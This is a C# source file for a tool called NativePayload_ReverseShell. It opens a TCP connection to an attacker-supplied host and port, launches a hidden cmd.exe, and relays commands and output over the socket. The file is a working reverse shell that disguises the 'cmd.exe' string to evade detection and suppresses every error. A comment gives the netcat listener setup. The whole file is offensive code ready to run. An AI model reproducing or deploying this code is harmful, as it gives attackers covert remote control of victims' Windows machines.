using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Threading;
using System.IO;
using System.Diagnostics;

namespace NativePayload_ReverseShell
{
    class Program
    {
        public static StringBuilder _Liger = new StringBuilder();
        private static StreamWriter _LionTiger;
        static void Main(string[] args)
        {
	    //// Step 1 (linux Side:192.168.56.1)   : nc -l -p 443 
	    //// Step 2 (Windows Side:192.168.56.x) : NativePayload_ReverseShell.exe 192.168.56.1 443 

 	    Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("NativePayload_ReverseShell , Published by Damon Mohammadbagher , 2018");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("NativePayload_ReverseShell , C# Managed Shell Code (Reverse Shell)");
            Console.WriteLine();

            try
            {
                using (TcpClient Simple = new TcpClient(args[0].ToString(), Convert.ToInt32(args[1])))
                {
                    Thread.Sleep(1100);
                    using (Stream Very = Simple.GetStream())
                    {
                        using (StreamReader OoPS = new StreamReader(Very))
                        {
                            _LionTiger = new StreamWriter(Very);
                            Process _Tiger = new Process();
                            Thread.Sleep(3300);
                            _Tiger.StartInfo.FileName = Convert.ToString("0123456789CmD" + "." + "e" + "XE l;X E f k X  E sgkf;sk X  E f s ; xefs;s").Substring(10, 8);
                            _Tiger.StartInfo.CreateNoWindow = true;
                            _Tiger.StartInfo.UseShellExecute = false;
                            _Tiger.OutputDataReceived += _OutputDataReceived;
                            _Tiger.StartInfo.RedirectStandardOutput = true;
                            _Tiger.StartInfo.RedirectStandardInput = true;
                            _Tiger.StartInfo.RedirectStandardError = true;
                            _Tiger.Start();
                            _Tiger.BeginOutputReadLine();
                            while (true)
                            {
                                Thread.Sleep(3000);
                                _Liger.Append(OoPS.ReadLine());
                                _Tiger.StandardInput.WriteLine(_Liger);
                                _Liger.Remove(0, _Liger.Length);
                            }
                        }
                    }

                }
            }
            catch (Exception) {  }
        }

        private static void _OutputDataReceived(object sender, DataReceivedEventArgs echo)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(echo.Data))
            {
                try
                {
                    strOutput.Append(echo.Data);
                    _LionTiger.WriteLine(strOutput);
                    _LionTiger.Flush();
                }
                catch (Exception err) { }
            }
        }
    }
}
